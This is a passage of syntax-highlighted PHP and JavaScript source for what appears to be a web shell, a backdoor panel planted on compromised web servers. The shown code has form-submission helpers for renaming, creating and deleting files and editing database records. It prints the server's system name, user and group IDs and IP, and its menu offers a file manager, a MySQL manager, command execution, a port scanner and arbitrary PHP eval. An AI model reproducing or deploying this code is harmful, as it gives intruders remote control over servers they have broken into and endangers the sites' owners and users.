<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">newfilename</span> = <span style="color: #4d4d4c; background-color: #ffffff;">prompt(</span><span style="color: #3e999f;">'Former file name:'</span>+<span style="color: #c82829; font-weight: bold;">oldname</span>+<span style="color: #3e999f;">'\nPlease input new filenam</span><span style="color: #3e999f; text-decoration: underline;">e:'</span><span style="text-decoration: underline;">, </span><span style="color: #3e999f; text-decoration: underline;">''</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #c82829; font-weight: bold;">newfilename</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'rename'</span>).<span style="color: #c82829; font-weight: bold;">newfilename</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">newfilename</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'rename'</span>).<span style="color: #c82829; font-weight: bold;">oldname</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">oldname</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'rename'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">dofile</span>(<span style="color: #c82829; font-weight: bold;">doing</span>,<span style="color: #c82829; font-weight: bold;">thefile</span>,<span style="color: #c82829; font-weight: bold;">m</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">m</span> &amp;&amp; !<span style="color: #4d4d4c; background-color: #ffffff;">confirm(</span><span style="color: #c82829; font-weight: bold;">m</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'filelist'</span>).<span style="color: #c82829; font-weight: bold;">doing</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">doing</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">thefile</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'filelist'</span>).<span style="color: #c82829; font-weight: bold;">thefile</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">thefile</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'filelist'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">createfile</span>(<span style="color: #c82829; font-weight: bold;">nowpath</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">var</span> <span style="color: #c82829; font-weight: bold;">filename</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #c82829; font-weight: bold;">filename</span> = <span style="color: #4d4d4c; background-color: #ffffff;">prompt(</span><span style="color: #3e999f;">'Please input the file name:'</span>, <span style="color: #3e999f;">''</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #c82829; font-weight: bold;">filename</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">opfile(</span><span style="color: #3e999f;">'editfile'</span>,<span style="color: #c82829; font-weight: bold;">nowpath</span> + <span style="color: #c82829; font-weight: bold;">filename</span>,<span style="color: #c82829; font-weight: bold;">nowpath</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">opfile</span>(<span style="color: #c82829; font-weight: bold;">action</span>,<span style="color: #c82829; font-weight: bold;">opfile</span>,<span style="color: #c82829; font-weight: bold;">dir</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileopform'</span>).<span style="color: #c82829; font-weight: bold;">action</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">action</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileopform'</span>).<span style="color: #c82829; font-weight: bold;">opfile</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">opfile</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileopform'</span>).<span style="color: #c82829; font-weight: bold;">dir</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">dir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'fileopform'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">godir</span>(<span style="color: #c82829; font-weight: bold;">dir</span>,<span style="color: #c82829; font-weight: bold;">view_writable</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">view_writable</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'godir'</span>).<span style="color: #c82829; font-weight: bold;">view_writable</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">view_writable</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'godir'</span>).<span style="color: #c82829; font-weight: bold;">dir</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">dir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'godir'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getsize</span>(<span style="color: #c82829; font-weight: bold;">getdir</span>,<span style="color: #c82829; font-weight: bold;">dir</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'getsize'</span>).<span style="color: #c82829; font-weight: bold;">getdir</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">getdir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'getsize'</span>).<span style="color: #c82829; font-weight: bold;">dir</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">dir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'getsize'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">editrecord</span>(<span style="color: #c82829; font-weight: bold;">action</span>, <span style="color: #c82829; font-weight: bold;">base64</span>, <span style="color: #c82829; font-weight: bold;">tablename</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">action</span> == <span style="color: #3e999f;">'del'</span>) {<span style="color: #c82829; background-color: #d6d6d6;">      </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #4d4d4c; background-color: #ffffff;">confirm(</span><span style="color: #3e999f;">'Is or isn\'t deletion record?'</span>)) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'recordlist'</span>).<span style="color: #c82829; font-weight: bold;">doing</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">action</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'recordlist'</span>).<span style="color: #c82829; font-weight: bold;">base64</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">base64</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'recordlist'</span>).<span style="color: #c82829; font-weight: bold;">tablename</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">tablename</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'recordlist'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">moddbname</span>(<span style="color: #c82829; font-weight: bold;">dbname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!<span style="color: #c82829; font-weight: bold;">dbname</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'setdbname'</span>).<span style="color: #c82829; font-weight: bold;">dbname</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">dbname</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'setdbname'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">settable</span>(<span style="color: #c82829; font-weight: bold;">tablename</span>,<span style="color: #c82829; font-weight: bold;">doing</span>,<span style="color: #c82829; font-weight: bold;">page</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!<span style="color: #c82829; font-weight: bold;">tablename</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">doing</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'settable'</span>).<span style="color: #c82829; font-weight: bold;">doing</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">doing</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #c82829; font-weight: bold;">page</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'settable'</span>).<span style="color: #c82829; font-weight: bold;">page</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">page</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'settable'</span>).<span style="color: #c82829; font-weight: bold;">tablename</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">tablename</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'settable'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">s</span>(<span style="color: #c82829; font-weight: bold;">action</span>,<span style="color: #c82829; font-weight: bold;">nowpath</span>,<span style="color: #c82829; font-weight: bold;">p1</span>,<span style="color: #c82829; font-weight: bold;">p2</span>,<span style="color: #c82829; font-weight: bold;">p3</span>,<span style="color: #c82829; font-weight: bold;">p4</span>,<span style="color: #c82829; font-weight: bold;">p5</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">action</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">action</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">action</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">nowpath</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">nowpath</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">nowpath</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">p1</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">p1</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">p1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">p2</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">p2</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">p2</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">p3</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">p3</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">p3</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">p4</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">p4</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">p4</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(<span style="color: #c82829; font-weight: bold;">p5</span>) <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #c82829; font-weight: bold;">p4</span>.<span style="color: #c82829; font-weight: bold;">value</span>=<span style="color: #c82829; font-weight: bold;">p5</span>;
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">g</span>(<span style="color: #c82829; font-weight: bold;">action</span>,<span style="color: #c82829; font-weight: bold;">nowpath</span>,<span style="color: #c82829; font-weight: bold;">p1</span>,<span style="color: #c82829; font-weight: bold;">p2</span>,<span style="color: #c82829; font-weight: bold;">p3</span>,<span style="color: #c82829; font-weight: bold;">p4</span>,<span style="color: #c82829; font-weight: bold;">p5</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!<span style="color: #c82829; font-weight: bold;">action</span>) <span style="color: #718c00;">return</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">s(</span><span style="color: #c82829; font-weight: bold;">action</span>,<span style="color: #c82829; font-weight: bold;">nowpath</span>,<span style="color: #c82829; font-weight: bold;">p1</span>,<span style="color: #c82829; font-weight: bold;">p2</span>,<span style="color: #c82829; font-weight: bold;">p3</span>,<span style="color: #c82829; font-weight: bold;">p4</span>,<span style="color: #c82829; font-weight: bold;">p5</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">$(</span><span style="color: #3e999f;">'opform'</span>).<span style="color: #4d4d4c; background-color: #ffffff;">submit(</span>);
}
<span style="color: #4271ae;">&lt;/script&gt;</span>
<span style="color: #4271ae;">&lt;/head&gt;</span>
<span style="color: #4271ae;">&lt;body</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"margin:0;table-layout:fixed; word-break:break-all"</span><span style="color: #4271ae;">&gt;</span>
<span style="color: #8959a8;">&lt;?php</span>
<span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=<span style="color: #4271ae;">&gt;</span><span style="color: #3e999f;">'opform'</span>));
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>, $<span style="color: #eab700;">action</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'nowpath'</span>, $<span style="color: #eab700;">nowpath</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'p1'</span>, $<span style="color: #eab700;">p1</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'p2'</span>, $<span style="color: #eab700;">p2</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'p3'</span>, $<span style="color: #eab700;">p3</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'p4'</span>, $<span style="color: #eab700;">p4</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'p5'</span>, $<span style="color: #eab700;">p5</span>);
<span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);

<span style="color: #718c00;">if</span>(!<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'posix_getegid'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">user</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">get_current_user(</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">uid</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">getmyuid(</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">gid</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">getmygid(</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">group</span> = <span style="color: #3e999f;">"?"</span>;
} <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">uid</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">posix_getpwuid(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">posix_geteuid(</span>));
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">gid</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">posix_getgrgid(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">posix_getegid(</span>));
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">user</span> = $<span style="color: #eab700;">uid</span>[<span style="color: #3e999f;">'name'</span>];
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">uid</span> = $<span style="color: #eab700;">uid</span>[<span style="color: #3e999f;">'uid'</span>];
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">group</span> = $<span style="color: #eab700;">gid</span>[<span style="color: #3e999f;">'name'</span>];
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">gid</span> = $<span style="color: #eab700;">gid</span>[<span style="color: #3e999f;">'gid'</span>];
}

<span style="color: #8959a8;">?&gt;</span>
<span style="color: #4271ae;">&lt;table</span> <span style="color: #4271ae;">width=</span><span style="color: #3e999f;">"100%"</span> <span style="color: #4271ae;">border=</span><span style="color: #3e999f;">"0"</span> <span style="color: #4271ae;">cellpadding=</span><span style="color: #3e999f;">"0"</span> <span style="color: #4271ae;">cellspacing=</span><span style="color: #3e999f;">"0"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;tr</span> <span style="color: #4271ae;">class=</span><span style="color: #3e999f;">"head"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td&gt;&lt;span</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"float:right;"</span><span style="color: #4271ae;">&gt;</span><span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">echo</span> @<span style="color: #4d4d4c; background-color: #ffffff;">php_uname(</span>);<span style="color: #8959a8;">?&gt;</span> / <span style="color: #c82829; font-weight: bold;">User</span>:<span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">e</span><span style="color: #718c00; text-decoration: underline;">cho</span><span style="text-decoration: underline;"> $</span><span style="color: #eab700; text-decoration: underline;">uid</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">user</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' ) / Group: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">gid</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' ( '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">group</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' )'</span><span style="text-decoration: underline;">;</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="color: #4271ae; text-decoration: underline;">&lt;/span&gt;</span><span style="color: #8959a8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #718c00; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #4271ae; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'HTTP_HOST'</span><span style="text-decoration: underline;">];</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #8959a8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #718c00; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">gethostbyname(</span><span style="text-decoration: underline;">$</span><span style="color: #4271ae; text-decoration: underline;">_SERVER</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'SERVER_NAME'</span><span style="text-decoration: underline;">]);</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #4271ae; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/tr&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;tr</span> <span style="color: #4271ae;">class=</span><span style="color: #3e999f;">"alt1"</span><span style="color: #4271ae;">&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;span</span> <span style="color: #4271ae;">style=</span><span style="color: #3e999f;">"float:right;"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">PHP</span> <span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">echo</span> <span style="color: #4271ae;">PHP_VERSION</span>;<span style="color: #8959a8;">?&gt;</span> / <span style="color: #c82829; font-weight: bold;">Safe</span> <span style="color: #c82829; font-weight: bold;">Mode</span><span style="text-decoration: underline;">:</span><span style="color: #8959a8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #718c00; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> </span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">getcfg(</span><span style="color: #3e999f; text-decoration: underline;">'safe_mode'</span><span style="text-decoration: underline;">);</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span><span style="color: #4271ae; text-decoration: underline;">&lt;/span&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('logout');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Logout</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('file');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">File</span> <span style="color: #c82829; font-weight: bold;">Manager</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('mysqladmin');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">MYSQL</span> <span style="color: #c82829; font-weight: bold;">Manager</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('sqlfile');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">MySQL</span> <span style="color: #c82829; font-weight: bold;">Upload</span> &amp;<span style="color: #c82829; font-weight: bold;">amp</span>; <span style="color: #c82829; font-weight: bold;">Download</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6; text-decoration: underline;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('shell');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Execute</span> <span style="color: #c82829; font-weight: bold;">Command</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('phpenv');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">PHP</span> <span style="color: #c82829; font-weight: bold;">Variable</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('portscan');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Port</span> <span style="color: #c82829; font-weight: bold;">Scan</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('secinfo');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Security</span> <span style="color: #c82829; font-weight: bold;">information</span><span style="color: #4271ae;">&lt;/a&gt;</span> |<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('eval');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Eval</span> <span style="color: #c82829; font-weight: bold;">PHP</span> <span style="color: #c82829; font-weight: bold;">Code</span><span style="color: #4271ae;">&lt;/a&gt;</span>
